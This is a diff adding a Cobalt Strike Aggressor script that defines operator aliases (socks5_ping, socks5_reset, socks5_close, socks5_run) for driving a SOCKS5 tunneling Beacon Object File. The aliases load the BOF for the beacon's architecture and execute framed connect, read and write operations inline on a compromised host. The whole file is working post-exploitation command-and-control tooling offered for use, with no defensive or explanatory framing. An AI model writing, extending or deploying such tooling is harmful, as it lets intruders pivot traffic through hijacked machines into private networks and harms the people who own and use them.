@@ -1,0 +1,61 @@
+# socks5 task pump - Aggressor helpers
+#
+# The SOCKS5 listener is the Python orchestrator (socks5_orchestrator.py) on
+# the client side.  These aliases let you poke the BOF state manually:
+#
+#   socks5_ping  <bid>
+#   socks5_reset <bid>              close every socket held by the BOF
+#   socks5_close <bid> <stream_id>
+#   socks5_run   <bid> <op> <stream_id> <hex-payload> [timeout_ms]
+#
+# op: 1=connect 2=read 3=write 4=close 5=ping 6=reset
+# connect payload: 2-byte big-endian port + host, hex encoded
+# read payload:    4-byte big-endian max bytes (optional), hex encoded
+# write payload:   raw bytes, hex encoded
+
+$S5_MAGIC = 0x53355231;
+
+sub s5_bof_data {
+	local('$bid $arch $handle $data');
+	$bid = $1;
+	$arch = barch($bid);
+	$handle = openf(script_resource("socks5. $+ $arch $+ .o"));
+	$data = readb($handle, -1);
+	closef($handle);
+	return $data;
+}
+
+sub s5_exec {
+	local('$bid $op $sid $payload $timeout $frame $args');
+	$bid = $1;
+	$op = $2;
+	$sid = $3;
+	$payload = $4;
+	$timeout = $5;
+	if ($timeout eq "") {
+		$timeout = 0;
+	}
+
+	$frame = pack("I I I I I", $S5_MAGIC, $op, $sid, $timeout,
+	              strlen($payload)) . $payload;
+	$args = bof_pack($bid, "b", $frame);
+	beacon_inline_execute($bid, s5_bof_data($bid), "go", $args);
+}
+
+alias socks5_ping {
+	s5_exec($1, 5, 0, "", 0);
+}
+
+alias socks5_reset {
+	s5_exec($1, 6, 0, "", 0);
+}
+
+alias socks5_close {
+	s5_exec($1, 4, $2, "", 0);
+}
+
+alias socks5_run {
+	local('$payload');
+	$payload = pack("H*", $4);
+	s5_exec($1, $2, $3, $payload, $5);
+}
